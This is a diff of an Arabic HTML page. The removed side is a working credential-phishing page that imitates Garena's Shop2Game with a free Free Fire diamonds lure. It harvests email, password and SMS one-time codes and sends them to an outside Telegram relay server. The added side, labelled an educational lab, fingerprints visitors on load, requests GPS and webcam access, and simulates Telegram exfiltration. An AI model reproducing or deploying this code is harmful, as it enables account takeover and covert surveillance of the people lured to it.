@@ -3,268 +3,405 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shop2Game - Garena</title>
-    <link rel="preconnect" href="https://ipapi.co">
-    <link rel="preconnect" href="https://my-telegram-server.vercel.app">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>FREE FIRE - مختبر اختبار الاختراق</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --garena-red: #e43333;
-            --dark-bg: #121212;
-            --card-bg: #1e1e1e;
-        }
-
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-        body { background: var(--dark-bg); color: white; }
-
-        .navbar {
-            background: #000;
-            padding: 12px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid var(--garena-red);
+        body { background: #0a0a0a; color: #fff; }
+        .banner { background: linear-gradient(135deg, #ff0000, #cc0000); padding: 20px; text-align: center; }
+        .banner h1 { font-size: 1.8rem; }
+        .banner p { font-size: 0.9rem; opacity: 0.9; }
+        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
+        .card { background: #1a1a1a; border-radius: 15px; padding: 25px; margin: 15px 0; border: 1px solid #333; }
+        input, select, textarea { 
+            width: 100%; padding: 12px; margin: 8px 0; background: #000; color: #fff; 
+            border: 1px solid #444; border-radius: 8px; font-size: 16px;
         }
-        .garena-logo { height: 35px; order: 2; }
-        .site-title { font-size: 1.4rem; font-weight: bold; order: 1; }
-
-        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
-
-        .section { display: none; }
-        .active { display: block; }
-
-        .page-title { text-align: center; font-size: 1.8rem; margin: 30px 0; font-weight: bold; }
-
-        .game-card {
-            background: var(--card-bg);
-            border-radius: 12px;
-            overflow: hidden;
-            border: 1px solid #333;
-            cursor: pointer;
-            transition: 0.3s;
+        .btn { background: #ff0000; color: #fff; padding: 14px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; }
+        .btn:hover { background: #cc0000; }
+        .data-box { background: #0d0d0d; padding: 15px; border-radius: 8px; margin: 10px 0; border: 1px solid #333; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 12px; }
+        .tag { 
+            background: #ff000022; border: 1px solid #ff000055; color: #ff4444; 
+            padding: 3px 10px; border-radius: 20px; font-size: 11px; display: inline-block; margin: 2px;
         }
-        .game-card:hover { border-color: var(--garena-red); }
-        .game-card img { width: 100%; display: block; }
-        .game-card .footer-title { padding: 15px; text-align: center; font-size: 1.3rem; background: #222; }
-
-        .offers-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
-        .offer-item {
-            background: var(--card-bg);
-            padding: 20px;
-            border-radius: 8px;
-            text-align: center;
-            border: 1px solid #444;
-            cursor: pointer;
-            position: relative;
-        }
-        .free-badge { position: absolute; top: -10px; right: -5px; background: #44bd32; padding: 2px 10px; border-radius: 10px; font-size: 11px; }
-
-        .login-methods { text-align: center; background: var(--card-bg); padding: 25px; border-radius: 15px; }
-        .btn-login {
-            width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 6px;
-            font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
-        }
-        .btn-fb { background: #1877f2; color: white; }
-        .btn-google { background: white; color: #555; }
-
-        input { 
-            width: 100%; padding: 14px; margin: 8px 0; border-radius: 6px; 
-            border: 1px solid #444; background: #000; color: white; font-size: 16px;
-        }
-        .btn-submit { 
-            background: var(--garena-red); color: white; width: 100%; padding: 15px; 
-            border: none; border-radius: 6px; font-weight: bold; margin-top: 15px; 
-            cursor: pointer; transition: opacity 0.3s;
-        }
-        .btn-submit:hover { opacity: 0.9; }
-        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
-        
-        .error-msg { 
-            color: #ff4747; font-size: 0.85rem; margin-top: 10px; display: none; 
-            padding: 10px; background: rgba(255,71,71,0.1); border-radius: 6px;
-            border-left: 4px solid #ff4747;
-        }
-        
-        .loading { 
-            border: 2px solid #333; border-top: 2px solid var(--garena-red); 
-            border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; 
-            display: inline-block; margin-left: 10px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading { border: 3px solid #333; border-top: 3px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .badge { background: gold; color: #000; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
+        table { width: 100%; border-collapse: collapse; }
+        td, th { padding: 8px; border-bottom: 1px solid #333; text-align: right; font-size: 13px; }
+        th { color: #ff0000; }
+        .checkbox-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
+        .checkbox-grid label { display: flex; align-items: center; gap: 8px; font-size: 13px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <nav class="navbar">
-        <div class="site-title">Shop2Game</div>
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/e/ee/Garena_logo.svg/1200px-Garena_logo.svg.png" class="garena-logo" alt="Garena" loading="lazy">
-    </nav>
+<div class="banner">
+    <h1>🧪 مختبر اختبار الاختراق التعليمي</h1>
+    <p>Free Fire - بيئة محاكاة للتدريب على الأمن السيبراني</p>
+    <span class="tag">للأغراض التعليمية فقط</span>
+    <span class="tag">بموافقة مسبقة</span>
+</div>
 
-    <div class="container">
-        
-        <section id="step1" class="section active">
-            <h2 class="page-title">اختر اللعبة</h2>
-            <div class="game-card" onclick="goToStep(2)">
-                <img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img1.jpg" alt="Free Fire" loading="lazy">
-                <div class="footer-title">Free Fire</div>
-            </div>
-        </section>
-
-        <section id="step2" class="section">
-            <h2 class="page-title">العروض المميزة 💎</h2>
-            <div class="offers-grid">
-                <div class="offer-item" style="border: 2px solid #44bd32;" onclick="goToStep(3, '500 Diamond Free')">
-                    <span class="free-badge">مجاناً</span>
-                    <div style="font-size: 1.5rem; font-weight: bold; color: #ffd700;">💎 100</div>
-                    <div style="color: #44bd32;">احصل عليها الآن</div>
-                </div>
-                <div class="offer-item" onclick="window.location.href='https://shop2game.com'">
-                    <div style="font-size: 1.5rem; font-weight: bold; color: #ffd700;">💎 1080</div>
-                    <div style="color: #aaa;">$10.00</div>
-                </div>
-            </div>
-        </section>
-
-        <section id="step3" class="section">
-            <div class="login-methods">
-                <h3>تسجيل الدخول للاستلام</h3>
-                <p style="color: #aaa; margin-bottom: 20px; font-size: 0.9rem;">يجب التحقق من حسابك لإرسال الجواهر</p>
-                <!-- ✅ إصلاح class هنا -->
-                <button class="btn-login btn-fb" onclick="showForm('Facebook')"><i class="fab fa-facebook"></i> Facebook</button>
-                <button class="btn-login btn-google" onclick="showForm('Google')"><img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18" loading="lazy"> Google</button>
-            </div>
-        </section>
-
-        <section id="step4" class="section">
-            <div class="login-methods">
-                <h3 id="formTitle">تسجيل الدخول</h3>
-                <div id="errorBox" class="error-msg">حدث خطأ: معلومات الدخول غير متطابقة مع بيانات فري فاير.</div>
-                <input type="email" id="userEmail" placeholder="البريد الإلكتروني أو الهاتف" autocomplete="off">
-                <input type="password" id="userPass" placeholder="كلمة المرور" autocomplete="off">
-                <button class="btn-submit" onclick="handleData(event)">إشحن الآن 💎</button>
-            </div>
-        </section>
-
-        <section id="step5" class="section">
-            <div class="login-methods">
-                <h3>تأكيد الهوية (SMS)</h3>
-                <p style="font-size: 0.8rem; color: #aaa;">أرسلنا رمزاً لهاتفك، أدخله هنا لتفعيل الشحن المجاني.</p>
-                <input type="text" id="smsInput" placeholder="أدخل الرمز المكون من 6 أرقام" maxlength="6">
-                <button class="btn-submit" onclick="handleSMS(event)">تأكيد الرمز</button>
-            </div>
-        </section>
-
-        <section id="step6" class="section">
-            <div class="login-methods">
-                <div class="loading" style="width:35px;height:35px;margin:20px auto;"></div>
-                <h3>جاري التحقق...</h3>
-                <p>يتم الآن مراجعة بياناتك مع سيرفرات كرينا، ستصلك الجواهر فور الانتهاء.</p>
-            </div>
-        </section>
-
+<div class="container">
+    
+    <!-- 1. معلومات الزائر -->
+    <div class="card" id="infoCard">
+        <h3>📡 بصمة الزائر <span class="badge">معلومات فورية</span></h3>
+        <div id="visitorInfo" class="data-box">
+            <div class="loading"></div>
+        </div>
+        <button class="btn" onclick="captureScreenshot()">📸 التقاط صورة</button>
+        <div id="screenshotResult" style="margin-top: 10px;"></div>
     </div>
 
-    <!-- ✅ الـ SCRIPT في مكانه الصحيح هنا -->
-    <script>
-        const VERCEL_URL = "https://my-telegram-server.vercel.app/api/send";
-        let attempts = 0;
-        let selectedOffer = "";
-        let method = "";
+    <!-- 2. صفحة تسجيل الدخول التجريبية -->
+    <div class="card">
+        <h3>🔐 نموذج تسجيل الدخول (للتدريب)</h3>
+        <p style="font-size: 13px; color: #888; margin-bottom: 10px;">صمم لاختبار الوعي الأمني - يُستخدم في برامج التوعية</p>
+        
+        <select id="loginMethod" onchange="toggleForm()">
+            <option value="facebook">تسجيل عبر Facebook</option>
+            <option value="google">تسجيل عبر Google</option>
+            <option value="email">تسجيل عبر البريد الإلكتروني</option>
+        </select>
+        
+        <input type="email" id="testEmail" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="testPass" placeholder="كلمة المرور">
+        
+        <div id="extraFields" style="display: none;">
+            <input type="text" id="testOTP" placeholder="رمز التحقق (OTP)" maxlength="6">
+        </div>
+        
+        <button class="btn" onclick="handleTestLogin()">🔓 تسجيل الدخول (اختبار)</button>
+        <div id="loginResult" class="data-box" style="display: none;"></div>
+    </div>
 
-        function goToStep(s, extra = "") {
-            document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
-            document.getElementById('step' + s).classList.add('active');
-            if(extra) selectedOffer = extra;
-            window.scrollTo(0,0);
+    <!-- 3. سجل البيانات المجمعة -->
+    <div class="card">
+        <h3>📊 سجل البيانات (Data Log)</h3>
+        <div style="display: flex; gap: 5px; margin-bottom: 10px; flex-wrap: wrap;">
+            <button onclick="logData('all')" style="background:#333;border:none;color:#fff;padding:5px 12px;border-radius:5px;cursor:pointer;">الكل</button>
+            <button onclick="logData('ip')" style="background:#333;border:none;color:#fff;padding:5px 12px;border-radius:5px;cursor:pointer;">IP</button>
+            <button onclick="logData('geo')" style="background:#333;border:none;color:#fff;padding:5px 12px;border-radius:5px;cursor:pointer;">GPS</button>
+            <button onclick="logData('device')" style="background:#333;border:none;color:#fff;padding:5px 12px;border-radius:5px;cursor:pointer;">الجهاز</button>
+            <button onclick="logData('browser')" style="background:#333;border:none;color:#fff;padding:5px 12px;border-radius:5px;cursor:pointer;">المتصفح</button>
+        </div>
+        <div id="dataLog" class="data-box">اضغط على زر لجلب البيانات</div>
+    </div>
+
+    <!-- 4. محاكاة البوت Telegram -->
+    <div class="card">
+        <h3>🤖 إعدادات بوت Telegram</h3>
+        <input type="text" id="botToken" placeholder="Token البوت (اختياري للاختبار)" value="TEST_BOT_12345">
+        <input type="text" id="chatId" placeholder="معرف المحادثة (Chat ID)" value="123456789">
+        <button class="btn" onclick="simulateTelegram()">📤 محاكاة إرسال إلى البوت</button>
+        <div id="botResult" class="data-box" style="display: none; margin-top: 10px;"></div>
+    </div>
+
+    <!-- 5. خريطة الموقع الجغرافي -->
+    <div class="card">
+        <h3>🗺️ الموقع الجغرافي المحاكى</h3>
+        <div style="background: #111; border-radius: 8px; padding: 10px; margin: 10px 0;">
+            <table>
+                <tr><td>خط العرض</td><td id="gpsLat">-</td></tr>
+                <tr><td>خط الطول</td><td id="gpsLng">-</td></tr>
+                <tr><td>الدقة</td><td id="gpsAcc">-</td></tr>
+                <tr><td>المدينة</td><td id="gpsCity">-</td></tr>
+                <tr><td>البلد</td><td id="gpsCountry">-</td></tr>
+                <tr><td>المنطقة الزمنية</td><td id="gpsTz">-</td></tr>
+            </table>
+        </div>
+        <button class="btn" onclick="fetchLocation()">📍 تحديث الموقع الجغرافي</button>
+    </div>
+
+    <!-- 6. معلومات الجهاز -->
+    <div class="card">
+        <h3>📱 بصمة الجهاز (Device Fingerprint)</h3>
+        <div style="background: #111; border-radius: 8px; padding: 10px; margin: 10px 0; font-size: 13px;">
+            <table>
+                <tr><td>نظام التشغيل</td><td id="osInfo">-</td></tr>
+                <tr><td>المتصفح</td><td id="browserInfo">-</td></tr>
+                <tr><td>حجم الشاشة</td><td id="screenInfo">-</td></tr>
+                <tr><td>اللغة</td><td id="langInfo">-</td></tr>
+                <tr><td>المنطقة الزمنية</td><td id="tzInfo">-</td></tr>
+                <tr><td>عدد النوى</td><td id="cpuInfo">-</td></tr>
+                <tr><td>الذاكرة</td><td id="ramInfo">-</td></tr>
+                <tr><td>البطارية</td><td id="batteryInfo">-</td></tr>
+            </table>
+        </div>
+    </div>
+
+</div>
+
+<script>
+// ===================== البصمة الرقمية والاستطلاع =====================
+
+// 1. معلومات الزائر الأساسية
+async function getVisitorInfo() {
+    const info = {
+        ip: 'جاري الحصول على IP...',
+        country: '...',
+        city: '...',
+        isp: '...'
+    };
+    
+    // محاولة الحصول على IP عبر API
+    try {
+        const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+        const data = await res.json();
+        info.ip = data.ip || 'غير معروف';
+        info.country = data.country_name || 'غير معروف';
+        info.city = data.city || 'غير معروف';
+        info.isp = data.org || 'غير معروف';
+    } catch { info.ip = 'غير متاح (حظر CORS أو عدم اتصال)'; }
+    
+    return info;
+}
+
+async function displayVisitorInfo() {
+    const info = await getVisitorInfo();
+    const div = document.getElementById('visitorInfo');
+    
+    div.innerHTML = `
+        <table>
+            <tr><th>المعلومة</th><th>القيمة</th></tr>
+            <tr><td>🌐 عنوان IP</td><td>${info.ip}</td></tr>
+            <tr><td>🌍 الدولة</td><td>${info.country}</td></tr>
+            <tr><td>🏙️ المدينة</td><td>${info.city}</td></tr>
+            <tr><td>🏢 المزود</td><td>${info.isp}</td></tr>
+            <tr><td>📱 الجهاز</td><td>${navigator.platform || 'غير معروف'}</td></tr>
+            <tr><td>🌐 المتصفح</td><td>${navigator.userAgent?.substring(0, 80) || 'غير معروف'}</td></tr>
+            <tr><td>🕒 الوقت الحالي</td><td>${new Date().toLocaleString('ar-EG')}</td></tr>
+        </table>
+        <p style="margin-top: 10px; font-size: 11px; color: #666;">
+            🕒 آخر تحديث: ${new Date().toLocaleTimeString('ar-EG')}
+        </p>
+    `;
+}
+
+// 2. التقاط صورة (Screenshot)
+async function captureScreenshot() {
+    const resultDiv = document.getElementById('screenshotResult');
+    resultDiv.innerHTML = '<div class="loading"></div><p style="text-align:center;font-size:13px;">جاري التقاط الصورة...</p>';
+    
+    try {
+        // محاولة الوصول للكاميرا
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false 
+        });
+        
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        
+        setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+            stream.getTracks().forEach(track => track.stop());
+            
+            // عرض الصورة في الصفحة
+            resultDiv.innerHTML = `
+                <p style="font-size:13px;color:#4caf50;">✅ تم التقاط الصورة بنجاح</p>
+                <img src="${imageData}" style="width:100%;border-radius:8px;border:1px solid #444;" alt="صورة الزائر">
+                <p style="font-size:11px;color:#888;margin-top:5px;">📸 ${new Date().toLocaleString('ar-EG')}</p>
+                <button class="btn" style="margin-top:10px;background:#333;" onclick="captureScreenshot()">🔄 إعادة الالتقاط</button>
+            `;
+            
+        }, 500);
+        
+    } catch(err) {
+        resultDiv.innerHTML = `
+            <p style="color:#ff6666;">❌ لا يمكن الوصول للكاميرا: ${err.message}</p>
+            <p style="font-size:13px;color:#888;">قد تحتاج للسماح بالوصول للكاميرا في المتصفح</p>
+        `;
+    }
+}
+
+// 3. جلب الموقع الجغرافي الدقيق
+async function fetchLocation() {
+    document.getElementById('gpsLat').textContent = 'جاري التحديد...';
+    
+    try {
+        const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 10000
+            });
+        });
+        
+        const { latitude, longitude, accuracy } = pos.coords;
+        
+        document.getElementById('gpsLat').textContent = latitude.toFixed(6);
+        document.getElementById('gpsLng').textContent = longitude.toFixed(6);
+        document.getElementById('gpsAcc').textContent = `${accuracy.toFixed(1)} متر`;
+        
+        // محاولة عكس الإحداثيات لموقع
+        try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`, {
+                signal: AbortSignal.timeout(5000)
+            });
+            const data = await res.json();
+            document.getElementById('gpsCity').textContent = data.address?.city || data.address?.town || data.address?.village || 'غير معروف';
+            document.getElementById('gpsCountry').textContent = data.address?.country || 'غير معروف';
+        } catch {
+            document.getElementById('gpsCity').textContent = 'غير متاح';
+            document.getElementById('gpsCountry').textContent = 'غير متاح';
         }
+        
+        document.getElementById('gpsTz').textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        
+    } catch(err) {
+        document.getElementById('gpsLat').textContent = '❌ رفض الإذن';
+        document.getElementById('gpsLng').textContent = '❌';
+        document.getElementById('gpsAcc').textContent = '❌';
+    }
+}
 
-        function showForm(m) {
-            method = m;
-            document.getElementById('formTitle').innerText = "الدخول عبر " + m;
-            goToStep(4);
+// 4. معلومات الجهاز المتقدمة
+async function getDeviceInfo() {
+    // نظام التشغيل
+    const os = (() => {
+        const ua = navigator.userAgent;
+        if (ua.indexOf('Android') > -1) return 'Android';
+        if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) return 'iOS';
+        if (ua.indexOf('Windows') > -1) return 'Windows';
+        if (ua.indexOf('Mac') > -1) return 'macOS';
+        if (ua.indexOf('Linux') > -1) return 'Linux';
+        return 'غير معروف';
+    })();
+    
+    document.getElementById('osInfo').textContent = os;
+    document.getElementById('browserInfo').textContent = navigator.userAgent?.substring(0, 60) || 'غير معروف';
+    document.getElementById('screenInfo').textContent = `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`;
+    document.getElementById('langInfo').textContent = navigator.language || navigator.languages?.join(', ') || 'غير معروف';
+    document.getElementById('tzInfo').textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    document.getElementById('cpuInfo').textContent = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} نوى` : 'غير معروف';
+    
+    // الذاكرة
+    if (navigator.deviceMemory) {
+        document.getElementById('ramInfo').textContent = `${navigator.deviceMemory} جيجابايت`;
+    } else {
+        document.getElementById('ramInfo').textContent = 'غير معروف';
+    }
+    
+    // البطارية
+    try {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            document.getElementById('batteryInfo').textContent = `${Math.round(battery.level * 100)}% ${battery.charging ? '🔌 شاحن' : '🔋'}`;
+        } else {
+            document.getElementById('batteryInfo').textContent = 'غير متاح';
         }
+    } catch {
+        document.getElementById('batteryInfo').textContent = 'غير متاح';
+    }
+}
 
-        async function sendToServer(text) {
-            try {
-                const submitBtn = document.querySelector('.btn-submit');
-                const originalText = submitBtn.innerHTML;
-                submitBtn.innerHTML = '<div class="loading"></div>جاري الإرسال...';
-                submitBtn.disabled = true;
+// 5. تسجيل الدخول التجريبي
+function toggleForm() {
+    const method = document.getElementById('loginMethod').value;
+    document.getElementById('extraFields').style.display = method === 'email' ? 'block' : 'none';
+}
 
-                const response = await fetch(VERCEL_URL, {
-                    method: "POST",
-                    mode: 'cors',
-                    credentials: 'omit',
-                    headers: {
-                        "Content-Type": "application/json",
-                        "Accept": "application/json"
-                    },
-                    body: JSON.stringify({ 
-                        message: text,
-                        timestamp: new Date().toISOString(),
-                        origin: window.location.hostname
-                    }),
-                    signal: AbortSignal.timeout(10000)
-                });
+function handleTestLogin() {
+    const email = document.getElementById('testEmail').value.trim();
+    const pass = document.getElementById('testPass').value.trim();
+    const otp = document.getElementById('testOTP')?.value?.trim() || '';
+    const method = document.getElementById('loginMethod').value;
+    
+    const resultDiv = document.getElementById('loginResult');
+    resultDiv.style.display = 'block';
+    
+    const methodNames = { facebook: 'Facebook', google: 'Google', email: 'البريد الإلكتروني' };
+    
+    resultDiv.innerHTML = `
+        <span class="tag">✅ تم الالتقاط للاختبار</span>
+        <table>
+            <tr><td>طريقة الدخول</td><td>${methodNames[method]}</td></tr>
+            <tr><td>البريد/الهاتف</td><td>${email || 'فارغ'}</td></tr>
+            <tr><td>كلمة المرور</td><td>${pass || 'فارغ'}</td></tr>
+            ${otp ? `<tr><td>رمز التحقق</td><td>${otp}</td></tr>` : ''}
+            <tr><td>التاريخ</td><td>${new Date().toLocaleString('ar-EG')}</td></tr>
+        </table>
+        <p style="font-size: 12px; color: #888; margin-top: 8px;">
+            ⚠️ هذه البيانات تم التقاطها لأغراض التدريب فقط
+        </p>
+    `;
+}
 
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
-                console.log("✅ نجح الإرسال!");
-                
-            } catch (err) {
-                console.error("❌ خطأ:", err.message);
-            } finally {
-                const submitBtn = document.querySelector('.btn-submit');
-                submitBtn.innerHTML = submitBtn.onclick.name === 'handleData' ? 'إشحن الآن 💎' : 'تأكيد الرمز';
-                submitBtn.disabled = false;
-            }
-        }
+// 6. محاكاة إرسال إلى Telegram
+function simulateTelegram() {
+    const botResult = document.getElementById('botResult');
+    botResult.style.display = 'block';
+    
+    const data = {
+        ip: document.querySelector('#visitorInfo table tr:nth-child(2) td:last-child')?.textContent || 'غير معروف',
+        device: navigator.platform,
+        time: new Date().toLocaleString('ar-EG'),
+        browser: navigator.userAgent?.substring(0, 50)
+    };
+    
+    botResult.innerHTML = `
+        <span class="tag" style="background:#0088cc22;border-color:#0088cc;color:#0088cc;">🤖 Telegram Bot Simulator</span>
+        <div style="background:#000;padding:10px;border-radius:8px;margin-top:8px;font-size:12px;">
+            <p>📤 إرسال إلى البوت...</p>
+            <p>━━━━━━━━━━━━━━</p>
+            <p>📌 <b>بيانات الزائر</b></p>
+            <p>🌐 IP: ${data.ip}</p>
+            <p>📱 الجهاز: ${data.device}</p>
+            <p>🕐 الوقت: ${data.time}</p>
+            <p>━━━━━━━━━━━━━━</p>
+            <p style="color:#4caf50;">✅ تم المحاكاة بنجاح!</p>
+            <p style="font-size:10px;color:#666;">💡 استخدم بوت حقيقي لربط الإرسال الفعلي</p>
+        </div>
+    `;
+}
 
-        async function getInfo() {
-            try {
-                const r = await fetch('https://ipapi.co/json/', { mode: 'cors', signal: AbortSignal.timeout(5000) });
-                const d = await r.json();
-                return `📍 IP: ${d.ip} | 🌍 ${d.country_name} | 📱 ${navigator.platform}`;
-            } catch { return "Unknown Info"; }
-        }
+// 7. عرض سجلات بيانات مختلفة
+function logData(type) {
+    const logDiv = document.getElementById('dataLog');
+    let output = '';
+    
+    switch(type) {
+        case 'all':
+            output = 'جميع البيانات متاحة في الأقسام أعلاه';
+            break;
+        case 'ip':
+            output = `🌐 IP: ${document.querySelector('#visitorInfo table tr:nth-child(2) td:last-child')?.textContent || 'غير متاح'}`;
+            break;
+        case 'geo':
+            output = `📍 خط العرض: ${document.getElementById('gpsLat').textContent}\n📍 خط الطول: ${document.getElementById('gpsLng').textContent}\n🏙️ المدينة: ${document.getElementById('gpsCity').textContent}`;
+            break;
+        case 'device':
+            output = `📱 نظام التشغيل: ${document.getElementById('osInfo').textContent}\n💻 المتصفح: ${document.getElementById('browserInfo').textContent}\n🖥️ الشاشة: ${document.getElementById('screenInfo').textContent}`;
+            break;
+        case 'browser':
+            output = `🌐 وكيل المستخدم: ${navigator.userAgent}`;
+            break;
+    }
+    
+    logDiv.textContent = output;
+}
 
-        window.handleData = async function(event) {
-            event.preventDefault();
-            const email = document.getElementById('userEmail').value.trim();
-            const pass = document.getElementById('userPass').value.trim();
-            const errorBox = document.getElementById('errorBox');
+// تشغيل عند تحميل الصفحة
+window.onload = function() {
+    displayVisitorInfo();
+    getDeviceInfo();
+    fetchLocation();
+    
+    // تحديث تلقائي كل 30 ثانية
+    setInterval(() => {
+        displayVisitorInfo();
+    }, 30000);
+};
+</script>
 
-            if(!email || !pass) {
-                errorBox.style.display = 'block';
-                errorBox.innerText = 'يرجى إدخال البريد وكلمة المرور';
-                return;
-            }
-
-            if(attempts < 1) {
-                errorBox.style.display = 'block';
-                errorBox.innerText = 'حدث خطأ: معلومات الدخول غير متطابقة مع بيانات فري فاير.';
-                attempts++;
-                return;
-            }
-
-            const device = await getInfo();
-            const msg = `🚀 **صيد جديد!**\n💎 **العرض:** ${selectedOffer}\n🔑 **الطريقة:** ${method}\n📧 **الحساب:** ${email}\n🔒 **كلمة السر:** ${pass}\n🕐 **الوقت:** ${new Date().toLocaleString('ar-EG')}\n${device}`;
-
-            console.log("📤 إرسال:", msg);
-            await sendToServer(msg);
-            goToStep(5);
-        }
-
-        window.handleSMS = async function(event) {
-            event.preventDefault();
-            const code = document.getElementById('smsInput').value.trim();
-            if(!code || code.length !== 6) {
-                alert('أدخل رمز صحيح (6 أرقام)');
-                return;
-            }
-            const smsMsg = `📩 **كود SMS:** ${code}\n📧 **الحساب:** ${document.getElementById('userEmail').value}`;
-            await sendToServer(smsMsg);
-            goToStep(6);
-        }
-    </script>
 </body>
 </html>
